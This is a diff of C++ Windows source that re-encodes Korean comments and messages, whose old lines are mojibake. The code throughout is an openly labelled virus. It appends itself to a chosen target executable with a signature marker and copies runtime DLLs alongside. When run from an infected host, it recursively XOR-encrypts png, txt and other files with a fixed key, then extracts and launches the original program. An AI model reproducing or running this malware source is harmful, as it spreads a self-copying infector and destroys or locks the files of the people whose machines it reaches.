@@ -9,12 +9,12 @@
 #define MAX 10000000
 enum SEARCH_MODE { DIRECTORY, FILET };
 
-void SearchFile(const char* path, const char* ext, SEARCH_MODE search); //µğ·ºÅä¸®, ÆÄÀÏ Àç±ÍÀû Å½»ö
-void FileDecoding(const char* path); //¾ÏÈ£È­, º¹È£È­
+void SearchFile(const char* path, const char* ext, SEARCH_MODE search); //ë””ë ‰í† ë¦¬, íŒŒì¼ ì¬ê·€ì  íƒìƒ‰
+void FileDecoding(const char* path); //ì•”í˜¸í™”, ë³µí˜¸í™”
 
-DWORD get_fsize(const char* pth); //ÆÄÀÏÀÇ »çÀÌÁî ±¸ÇÔ
-char* get_cur_file(); //ÀÚ±âÀÚ½ÅÀÇ Àı´ë°æ·Î ¹İÈ¯
-char* get_tfile(); //ÀÓ½ÃÆÄÀÏ °æ·Î ¹ß±Ş¹ŞÀ½
+DWORD get_fsize(const char* pth); //íŒŒì¼ì˜ ì‚¬ì´ì¦ˆ êµ¬í•¨
+char* get_cur_file(); //ìê¸°ìì‹ ì˜ ì ˆëŒ€ê²½ë¡œ ë°˜í™˜
+char* get_tfile(); //ì„ì‹œíŒŒì¼ ê²½ë¡œ ë°œê¸‰ë°›ìŒ
 int IsInfected(const char* path);
 int CheckMySelf();
 void Extract_Original();
@@ -32,7 +32,7 @@ struct HYD_struct {
 
 char* tchar2char(TCHAR* unicode)
 {
-	//TCHAR¸¦ char·Î º¯È¯½ÃÄÑÁÖ´Â ÇÔ¼ö
+	//TCHARë¥¼ charë¡œ ë³€í™˜ì‹œì¼œì£¼ëŠ” í•¨ìˆ˜
 
 	char* szRet = NULL;
 	int len = ::WideCharToMultiByte(CP_ACP, 0, unicode, -1, szRet, 0, NULL, NULL);
@@ -49,23 +49,23 @@ char* tchar2char(TCHAR* unicode)
 }
 
 int main(int argc, char** argv) {
-	setlocale(LC_ALL, ""); //ÇÑ±ÛÀ» ÀÔ·Â¹Ş±â À§ÇØ »ç¿ë
+	setlocale(LC_ALL, ""); //í•œê¸€ì„ ì…ë ¥ë°›ê¸° ìœ„í•´ ì‚¬ìš©
 
 	/*
-	* ¹ÙÅÁÈ­¸é Á¢±Ù ÄÚµå
+	* ë°”íƒ•í™”ë©´ ì ‘ê·¼ ì½”ë“œ
 	TCHAR Desctop_Path[PATH_SIZE];
-	SHGetSpecialFolderPath(NULL, Desctop_Path, CSIDL_DESKTOP, FALSE); //¹ÙÅÁÈ­¸é °æ·Î¸¦ °¡Á®¿Â´Ù
+	SHGetSpecialFolderPath(NULL, Desctop_Path, CSIDL_DESKTOP, FALSE); //ë°”íƒ•í™”ë©´ ê²½ë¡œë¥¼ ê°€ì ¸ì˜¨ë‹¤
 
 	char* path;
 	path = tchar2char(Desctop_Path);
-	strcpy(DesctopPath, path); //Àü¿ªº¯¼ö¿¡ °ª ´ëÀÔ
+	strcpy(DesctopPath, path); //ì „ì—­ë³€ìˆ˜ì— ê°’ ëŒ€ì…
 
-	printf("¹ÙÅÁÈ­¸é °æ·Î : %s\n", DesctopPath);
+	printf("ë°”íƒ•í™”ë©´ ê²½ë¡œ : %s\n", DesctopPath);
 
 	char* InfectTargetPath = (char*)malloc(sizeof(char) * PATH_SIZE);
 	sprintf(InfectTargetPath, "%s\\HYDhost.exe", path);
 
-	printf("¼÷ÁÖÆÄÀÏ °æ·Î : %s\n", InfectTargetPath);	
+	printf("ìˆ™ì£¼íŒŒì¼ ê²½ë¡œ : %s\n", InfectTargetPath);	
 	*/
 
 	char InfectTargetPath[PATH_SIZE];
@@ -76,18 +76,18 @@ int main(int argc, char** argv) {
 
 
 	if (!CheckMySelf()) {
-		printf("ÀÚ±âÀÚ½ÅÀÌ ¼÷ÁÖÆÄÀÏÀÌ ¾Æ´Õ´Ï´Ù.\n");
+		printf("ìê¸°ìì‹ ì´ ìˆ™ì£¼íŒŒì¼ì´ ì•„ë‹™ë‹ˆë‹¤.\n");
 	}
 	else {
-		//¿Ö ÃßÃâÀÌ ¾ÈµÇÁö?
-		//fseek¶û ftell ¿ø¸®¸¦ ¸ô¶ú±â ¶§¹®ÀÌ´Ù
+		//ì™œ ì¶”ì¶œì´ ì•ˆë˜ì§€?
+		//fseekë‘ ftell ì›ë¦¬ë¥¼ ëª°ëê¸° ë•Œë¬¸ì´ë‹¤
 
-		printf("ÀÚ±âÀÚ½ÅÀÌ ¼÷ÁÖÆÄÀÏÀÔ´Ï´Ù\n");
-		printf("¾ÏÈ£È­¸¦ ½ÃÀÛÇÕ´Ï´Ù\n");
+		printf("ìê¸°ìì‹ ì´ ìˆ™ì£¼íŒŒì¼ì…ë‹ˆë‹¤\n");
+		printf("ì•”í˜¸í™”ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤\n");
 
-		printf("¾ÏÈ£È­ÇÏ°íÀÚ ÇÏ´Â ÆÄÀÏÀÇ Àı´ë°æ·Î: \n\n");
+		printf("ì•”í˜¸í™”í•˜ê³ ì í•˜ëŠ” íŒŒì¼ì˜ ì ˆëŒ€ê²½ë¡œ: \n\n");
 		std::cin.getline(path, PATH_SIZE, '\n');
-		//¶ç¾î¾²±â ±¸ºĞ¾øÀÌ ÀÔ·Â¹Ş±â À§ÇØ getlineÀ» »ç¿ëÇß´Ù
+		//ë„ì–´ì“°ê¸° êµ¬ë¶„ì—†ì´ ì…ë ¥ë°›ê¸° ìœ„í•´ getlineì„ ì‚¬ìš©í–ˆë‹¤
 
 		SearchFile(path, "png", DIRECTORY);
 		SearchFile(path, "png", FILET);
@@ -101,24 +101,24 @@ int main(int argc, char** argv) {
 		SearchFile(path, "txt", FILET);		
 		
 
-		Extract_Original(); //µŞºÎºĞ µû·Î ¶§³×¼­ ½ÇÇà
+		Extract_Original(); //ë’·ë¶€ë¶„ ë”°ë¡œ ë•Œë„¤ì„œ ì‹¤í–‰
 
 		//std::cin >> DoNotEndTheProgram;
 
 		exit(1);
 	}
 
-	printf("°¨¿°½ÃÅ³ Å¸°Ù ÇÁ·Î±×·¥ÀÇ Àı´ë°æ·Î: \n\n");
+	printf("ê°ì—¼ì‹œí‚¬ íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ì˜ ì ˆëŒ€ê²½ë¡œ: \n\n");
 	std::cin.getline(InfectTargetPath, PATH_SIZE, '\n');
-	std::cout << "ÁÖ¼Ò: " << InfectTargetPath << std::endl;
+	std::cout << "ì£¼ì†Œ: " << InfectTargetPath << std::endl;
 
-	printf("Å¸°Ù ÇÁ·Î±×·¥ °¨¿°¿©ºÎ È®ÀÎ...\n");
+	printf("íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ ê°ì—¼ì—¬ë¶€ í™•ì¸...\n");
 	
 	if (IsInfected(InfectTargetPath)) {
-		printf("Å¸°Ù ÇÁ·Î±×·¥ ÀÌ¹Ì °¨¿°µÊ\n");
+		printf("íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ ì´ë¯¸ ê°ì—¼ë¨\n");
 	}
 	else {
-		printf("Å¸°Ù ÇÁ·Î±×·¥ °¨¿°½ÃÅ°´ÂÁß...\n");
+		printf("íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ ê°ì—¼ì‹œí‚¤ëŠ”ì¤‘...\n");
 		InfectProgram(InfectTargetPath);
 	}
 
@@ -136,7 +136,7 @@ void SearchFile(const char* path, const char* ext, SEARCH_MODE search) {
 		sprintf(newPath, "%s\\*", path);
 	}
 	else {
-		printf(".%s Ã£´ÂÁß\n", ext);
+		printf(".%s ì°¾ëŠ”ì¤‘\n", ext);
 		sprintf(newPath, "%s\\*.%s", path, ext);
 	}
 
@@ -147,18 +147,18 @@ void SearchFile(const char* path, const char* ext, SEARCH_MODE search) {
 
 	 do{
 		if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(data.cFileName, ".") && strcmp(data.cFileName, "..")) {
-			std::cout << "µğ·ºÅä¸®: " << std::string(data.cFileName) << std::endl;
+			std::cout << "ë””ë ‰í† ë¦¬: " << std::string(data.cFileName) << std::endl;
 			sprintf(newPath, "%s\\%s", path, std::string(data.cFileName).c_str());
 			SearchFile(newPath, ext, DIRECTORY);
 			SearchFile(newPath, ext, FILET);
 			
 		}
 		else if ((search == FILET) && (data.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) && !(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)) {
-			std::cout << "ÆÄÀÏ: " << std::string(data.cFileName) << std::endl;
+			std::cout << "íŒŒì¼: " << std::string(data.cFileName) << std::endl;
 			sprintf(newPath, "%s\\%s", path, std::string(data.cFileName).c_str());
 
 			FileDecoding(newPath);
-			printf("%s ¾ÏÈ£È­/º¹È£È­ ÇÏ´ÂÁß\n", std::string(data.cFileName).c_str());
+			printf("%s ì•”í˜¸í™”/ë³µí˜¸í™” í•˜ëŠ”ì¤‘\n", std::string(data.cFileName).c_str());
 		}
 	}while (FindNextFileA(hFind, &data));
 
@@ -169,7 +169,7 @@ void SearchFile(const char* path, const char* ext, SEARCH_MODE search) {
 
 void FileDecoding(const char* path)
 {
-	//¾ÏÈ£È­ & º¹È£È­
+	//ì•”í˜¸í™” & ë³µí˜¸í™”
 
 	int key = 0x456789AB;
 
@@ -244,13 +244,13 @@ int IsInfected(const char* path) {
 	fopen_s(&ReadF, path, "rb");
 
 	if (ReadF == NULL) {
-		printf("°¨¿°´ë»ó ÆÄÀÏÀ» Ã£Áö ¸øÇß½À´Ï´Ù\n");
+		printf("ê°ì—¼ëŒ€ìƒ íŒŒì¼ì„ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤\n");
 		return 1;
 	}
 
 	HYD_struct buffer;
 
-	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //¼ø¹æÇâÀ¸·Î HYD_struct ±¸Á¶Ã¼ »«¸¸Å­ ÀÌµ¿
+	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //ìˆœë°©í–¥ìœ¼ë¡œ HYD_struct êµ¬ì¡°ì²´ ëº€ë§Œí¼ ì´ë™
 
 	fread((void*)&buffer, 1, sizeof(HYD_struct), ReadF);
 
@@ -274,13 +274,13 @@ int CheckMySelf() {
 	fopen_s(&ReadF, path, "rb");
 
 	if (ReadF == NULL) {
-		printf("ÀÚ±âÀÚ½ÅÀ» Ã£Áö ¸øÇß½À´Ï´Ù\n");
+		printf("ìê¸°ìì‹ ì„ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤\n");
 		return 1;
 	}
-	printf("ÀÚ±âÀÚ½ÅÀÌ ¼÷ÁÖÆÄÀÏÀÎÁö È®ÀÎÇÕ´Ï´Ù\n");
+	printf("ìê¸°ìì‹ ì´ ìˆ™ì£¼íŒŒì¼ì¸ì§€ í™•ì¸í•©ë‹ˆë‹¤\n");
 
-	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //¼ø¹æÇâÀ¸·Î HYD_struct ±¸Á¶Ã¼ »«¸¸Å­ ÀÌµ¿
-	//sizeof(char) ¸¸Å­ ´õ »©Áà¾ß ÇÏ´Â ÀÌÀ¯´Â?
+	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //ìˆœë°©í–¥ìœ¼ë¡œ HYD_struct êµ¬ì¡°ì²´ ëº€ë§Œí¼ ì´ë™
+	//sizeof(char) ë§Œí¼ ë” ë¹¼ì¤˜ì•¼ í•˜ëŠ” ì´ìœ ëŠ”?
 
 	HYD_struct buffer;
 
@@ -308,7 +308,7 @@ void Extract_Original() {
 	fopen_s(&ReadF, cur, "rb");
 
 	if (ReadF == NULL) {
-		printf("°¨¿°´ë»ó ÆÄÀÏÀ» Ã£Áö ¸øÇß½À´Ï´Ù\n");
+		printf("ê°ì—¼ëŒ€ìƒ íŒŒì¼ì„ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤\n");
 		return;
 	}
 
@@ -316,7 +316,7 @@ void Extract_Original() {
 	fopen_s(&WriteF, tmp_file, "wb");
 
 	if (WriteF == NULL) {
-		printf("°¨¿°´ë»ó ÆÄÀÏÀ» Ã£Áö ¸øÇß½À´Ï´Ù\n");
+		printf("ê°ì—¼ëŒ€ìƒ íŒŒì¼ì„ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤\n");
 		fclose(ReadF);
 
 		free(tmp_file);
@@ -326,22 +326,22 @@ void Extract_Original() {
 	HYD_struct Hstruct;
 	int buffer;
 
-	fseek(ReadF, get_fsize(cur) - sizeof(HYD_struct), SEEK_SET); //¼ø¹æÇâÀ¸·Î HYD_struct ±¸Á¶Ã¼ »«¸¸Å­ ÀÌµ¿
-	//sizeof(char) ¸¸Å­ ´õ »©Áà¾ß ÇÏ´Â ÀÌÀ¯´Â?
+	fseek(ReadF, get_fsize(cur) - sizeof(HYD_struct), SEEK_SET); //ìˆœë°©í–¥ìœ¼ë¡œ HYD_struct êµ¬ì¡°ì²´ ëº€ë§Œí¼ ì´ë™
+	//sizeof(char) ë§Œí¼ ë” ë¹¼ì¤˜ì•¼ í•˜ëŠ” ì´ìœ ëŠ”?
 	printf("ftell before : %d\n", ftell(ReadF));
 	fread((void*)&Hstruct, 1, sizeof(HYD_struct), ReadF);
 	printf("ftell present : %d\n", ftell(ReadF));
 
-	printf("Hstruct fsize : %d\n", Hstruct.fsize); //fsize °ª ÀÌ»ó
+	printf("Hstruct fsize : %d\n", Hstruct.fsize); //fsize ê°’ ì´ìƒ
 
-	fseek(ReadF, get_fsize(cur) - Hstruct.fsize - sizeof(HYD_struct) - 1, SEEK_SET); //¿øº» ÆÄÀÏ °Ç³Ê¶Ù°í ÀĞ±â ½ÃÀÛ
-	//fseek¿¡¼­ Ã¹¹øÂ° µ¥ÀÌÅÍÀÇ À§Ä¡(SEEK_SET)°¡ 0ÀÌ´Ù.
+	fseek(ReadF, get_fsize(cur) - Hstruct.fsize - sizeof(HYD_struct) - 1, SEEK_SET); //ì›ë³¸ íŒŒì¼ ê±´ë„ˆë›°ê³  ì½ê¸° ì‹œì‘
+	//fseekì—ì„œ ì²«ë²ˆì§¸ ë°ì´í„°ì˜ ìœ„ì¹˜(SEEK_SET)ê°€ 0ì´ë‹¤.
 
 	printf("ftell after : %d\n", ftell(ReadF));
 
 	while (ftell(ReadF) != get_fsize(cur) - sizeof(HYD_struct) - 1)
 	{
-		//ftellÀº °¡Àå ¾ÕºÎºĞ ¹ÙÀÌÆ® À§Ä¡¸¦ 0À¸·Î °£ÁÖÇÑ´Ù´Â Á¡À» ÁÖÀÇÇÏÀÚ(1À» »©´Â ÀÌÀ¯)
+		//ftellì€ ê°€ì¥ ì•ë¶€ë¶„ ë°”ì´íŠ¸ ìœ„ì¹˜ë¥¼ 0ìœ¼ë¡œ ê°„ì£¼í•œë‹¤ëŠ” ì ì„ ì£¼ì˜í•˜ì(1ì„ ë¹¼ëŠ” ì´ìœ )
 		buffer = fgetc(ReadF);
 		fputc(buffer, WriteF);
 	}
@@ -350,21 +350,21 @@ void Extract_Original() {
 	fflush(WriteF);
 	fclose(WriteF);
 
-	//ÀÓ½ÃÆÄÀÏ ½ÇÇàÇÏ±â
+	//ì„ì‹œíŒŒì¼ ì‹¤í–‰í•˜ê¸°
 	//startup(tmp_file);
 	//ShellExecuteA(NULL, "open", tmp_file, NULL, NULL, SW_SHOWDEFAULT);
-	//tmp ÆÄÀÏÀº ½ÇÇà¾ÈµÊ. µû·Î ÀúÀå ÈÄ ½ÇÇà?
+	//tmp íŒŒì¼ì€ ì‹¤í–‰ì•ˆë¨. ë”°ë¡œ ì €ì¥ í›„ ì‹¤í–‰?
 
-	printf("¿øº» ÇÁ·Î±×·¥ ½ÇÇàÁß\n");
+	printf("ì›ë³¸ í”„ë¡œê·¸ë¨ ì‹¤í–‰ì¤‘\n");
 	WinExec(tmp_file, SW_NORMAL);
 
-	//code injection Ã£¾Æº¸±â
+	//code injection ì°¾ì•„ë³´ê¸°
 	free(tmp_file);
 	free(cur);
 }
 
 char* GetDirectory(const char* path) {
-	//µğ·ºÅä¸® ÃßÃâ
+	//ë””ë ‰í† ë¦¬ ì¶”ì¶œ
 	int i = 0;
 	int lastWpos = 0;
 	char* InfectedDictionary = (char*)malloc(sizeof(char) * PATH_SIZE);
@@ -407,7 +407,7 @@ void InfectProgram(const char* path) {
 		return;
 	}
 
-	printf("ÀÚ±âÀÚ½Å ÀÓ½ÃÆÄÀÏ·Î º¹»çÁß...\n");
+	printf("ìê¸°ìì‹  ì„ì‹œíŒŒì¼ë¡œ ë³µì‚¬ì¤‘...\n");
 	while (1)
 	{
 		buffer = fgetc(ReadF);
@@ -422,14 +422,14 @@ void InfectProgram(const char* path) {
 
 
 	fopen_s(&ReadF, path, "rb");
-	printf("¿øº»ÆÄÀÏ ÀÓ½ÃÆÄÀÏ·Î º¹»çÁß...\n");
+	printf("ì›ë³¸íŒŒì¼ ì„ì‹œíŒŒì¼ë¡œ ë³µì‚¬ì¤‘...\n");
 	if (ReadF == NULL) {
 		printf("failed r");
 		return;
 	}
 
-	fseek(WriteF, 0L, SEEK_END);//³¡À¸·Î ÀÌµ¿
-	//fseek SEEK_END´Â ÆÄÀÏ µ¥ÀÌÅÍ ¸¶Áö¸·ÀÌ ¾Æ´Ï¶ó ÆÄÀÏÀÇ ³¡À» Ç¥½ÃÇÏ±â À§ÇØ »ğÀÔµÇ´Â EOF¸¦ ÀÇ¹Ì
+	fseek(WriteF, 0L, SEEK_END);//ëìœ¼ë¡œ ì´ë™
+	//fseek SEEK_ENDëŠ” íŒŒì¼ ë°ì´í„° ë§ˆì§€ë§‰ì´ ì•„ë‹ˆë¼ íŒŒì¼ì˜ ëì„ í‘œì‹œí•˜ê¸° ìœ„í•´ ì‚½ì…ë˜ëŠ” EOFë¥¼ ì˜ë¯¸
 
 	while (1)
 	{
@@ -442,10 +442,10 @@ void InfectProgram(const char* path) {
 	fflush(WriteF);
 	fclose(ReadF);
 
-	//HYD Struct µ¥ÀÌÅÍ Ãß°¡//
+	//HYD Struct ë°ì´í„° ì¶”ê°€//
 	fseek(WriteF, 0L, SEEK_END);
 
-	hs.fsize = get_fsize(path); //°¨¿° ´ë»ó ¿øº» »çÀÌÁî ÀúÀå
+	hs.fsize = get_fsize(path); //ê°ì—¼ ëŒ€ìƒ ì›ë³¸ ì‚¬ì´ì¦ˆ ì €ì¥
 	strcpy(hs.sign, signature);
 
 	fwrite((void*)&hs, sizeof(HYD_struct), 1, WriteF);
@@ -454,7 +454,7 @@ void InfectProgram(const char* path) {
 	fclose(WriteF);
 	
 
-	printf("ÀÓ½ÃÆÄÀÏ ¿øº»ÆÄÀÏ¿¡ µ¤¾î¾²´ÂÁß...\n");
+	printf("ì„ì‹œíŒŒì¼ ì›ë³¸íŒŒì¼ì— ë®ì–´ì“°ëŠ”ì¤‘...\n");
 
 	CopyFileA(tmp_file, path, false);
 
@@ -472,7 +472,7 @@ void InfectProgram(const char* path) {
 	sprintf(Destination2, "%s\\VCRUNTIME140.dll", InfectDirectory);
 	CopyFileA("VCRUNTIME140.dll", Destination2, false);
 	
-	printf("º¹Á¦¿Ï·á\n");
+	printf("ë³µì œì™„ë£Œ\n");
 
 	free(InfectDirectory);
 	free(Destination1);
